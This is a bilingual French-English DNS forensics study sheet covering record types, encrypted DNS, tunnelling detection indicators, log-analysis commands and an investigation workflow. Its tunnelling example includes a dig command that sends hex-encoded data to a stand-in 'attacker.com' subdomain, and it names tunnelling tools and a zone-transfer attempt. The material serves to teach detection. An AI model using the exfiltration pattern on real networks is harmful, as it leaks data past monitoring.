📋 DNS = Domain Name System (RFC 1035)
Protocole couche application qui traduit noms domaine (example.com) en adresses IP (93.184.216.34). Utilisé pour TOUT sur internet (mail, web, API). Forensiquement = très révélateur.
DNS Record Types Courants
Type Purpose Forensique Exemple
A IPv4 address 🔴 PRINCIPAL (où va le traffic) example.com → 93.184.216.34
MX Mail server Email routing (phishing?) example.com MX → mail.example.com
NS Name server Qui gère le domaine example.com NS → ns1.example.com
TXT Text records 🟠 SPF, DKIM (authentication) v=spf1 include:_spf.google.com
SRV Service records Localiser services (SIP, Jabber) _sip._tcp.example.com
CNAME Alias 🔴 Domaines masqués (C2 redirect) www.example.com CNAME → cdn.example.com
DNS Query Format (Wire Format)
QUERY EXAMPLE (Wireshark dump)

Frame 1234: 81 bytes on wire (648 bits)
DNS (id=0x1234)
  Transaction ID: 0x1234
  Flags: 0x0100 (Standard query)
  Questions: 1
    example.com: type A, class IN
  Answers: 1
    example.com: type A, class IN, TTL 3600
      Address: 93.184.216.34

↑ TTL = Time To Live (cache duration)
⚠️ Pourquoi DNS en Forensique?
  • Visible sur logs : Même trafic HTTPS chiffré, requête DNS = en clair (sauf DoH)
  • Révèle intent : Quels sites visités, quels services utilisés
  • Peut exfiltrer data : Subdomains encodent données (DNS tunneling)
  • C2 communication : Malware beacon via DNS queries
  • Timeline précis : Chaque query = timestamp serveur DNS
🔒 DNS Chiffré : DoH, DoT, DNSSEC
Moderne DNS = chiffrement pour privacy. Mais crée detection blind spots.
Trois Standards Chiffrement
DoH (RFC 8484)
DNS over HTTPS
Port 443 (HTTPS)
Inside TLS handshake
⚠️ Invisible à proxy
Usage: Chrome, Firefox
DoT (RFC 7858)
DNS over TLS
Port 853 (TLS)
Distinct from DNS
⚠️ Easier detect (port)
Usage: Android 9+
DNSSEC (RFC 4034)
Signature validation
NOT encryption
Verifies authenticity
✅ Still visible
Usage: ICANN standard
Impact Forensique
Standard Query Visible? Metadata Detection
DoH ❌ NO (HTTPS flow) IP dest, flow size, timing 🟠 Hard (analyze HTTPS metadata)
DoT ❌ NO (TLS 853) Port 853 = distinctive 🟡 Easier (port signature)
DNSSEC ✅ YES (still DNS) Full query visible 🟢 Easy (parse normally)
Plain DNS ✅ YES (UDP 53) Complete query 🟢 Very easy
🔍 Detection DoH en Traffic
Même si query chiffré, metadata révèle:
• Destination IP = Google (8.8.8.8), Cloudflare (1.1.1.1), etc.
• Port 443 + TLS certificate = DoH provider
• Flow size patterns (domains = certain size)
• Timing analysis (timing peut révéler quoi demandé)
→ Possible tracer DoH usage même sans voir queries
🔷 DNS Tunneling = Exfiltration via DNS
Attaquant encode data dans subdomains. Chaque requête = quelques octets data. Invisible aux proxies (DNS pas considéré "data").
Mechanism: Comment ça Marche
Exemple : Exfiltrer "HELLO"
1. Encoder "HELLO" en hex : 48 45 4C 4C 4F
2. Créer subdomains :
  48454c4c4f.attacker.com
3. Client malware queries :
  dig 48454c4c4f.attacker.com @dns.server
4. DNS log enregistre requête
5. Attacker lit log DNS → décode "HELLO"

Result: 5 bytes exfiltré via DNS!
Tools Courantes
Outil Fonction Detection
dnscat2 DNS C2 + exfiltration High subdomain entropy
iodine DNS tunnel (legacy) Specific pattern matching
dns2tcp Tunnel TCP over DNS Long query sequences
🚨 Detection Indicators
  • Subdomain entropy = HIGH (random chars, not dictionary)
  • Query frequency = EXCESSIVE (thousands/hour)
  • Query length = LONG (max DNS label = 63 chars)
  • Failed responses = NXDOMAIN repeatedly (domain doesn't exist)
  • Volume = Unusual bytes/second over DNS
📊 DNS Log Analysis Forensique
DNS servers logent queries. Analyzer logs = reconstruct network behavior, detect C2, find exfiltration.

🔍 Detection Rules & Tools
Malware DNS patterns = détectable. Rules basées sur entropy, frequency, known-bad domains.
Detection Strategies
Technique Indicateur Tool

CLI Quick Commands
# Query DNS (see response)
$ dig example.com @8.8.8.8
$ dig example.com MX +short

# Zone transfer attempt (may fail)
$ dig @ns1.example.com example.com axfr

# Reverse DNS
$ dig -x 93.184.216.34

# Analyze DNS logs for suspicious patterns
$ grep NXDOMAIN /var/log/named.log | wc -l
$ cat dns.log | awk '{print $5}' | sort | uniq -c | sort -rn | head

# Entropy calculation (Python)
$ python3 -c "import math; d='randomdomain'; h=-sum(d.count(c)/len(d)*math.log2(d.count(c)/len(d)) for c in set(d)); print(f'Entropy: {h:.2f}')"
✅ Workflow Forensique DNS
  1. Extraire logs DNS (firewall, recursive resolver, autoritaire)
  2. Analyser patterns (frequency, entropy, NXDOMAIN %)
  3. Cross-check IOCs (Threat Intel feeds)
  4. Identify C2 domains (known-bad, suspicious patterns)
  5. Timeline reconstruction (when compromise began)
  6. Correlate avec autres sources (NetFlow, Syslog, HTTP logs)
  7. Rapport forensique (timeline, IOCs, recommendations)
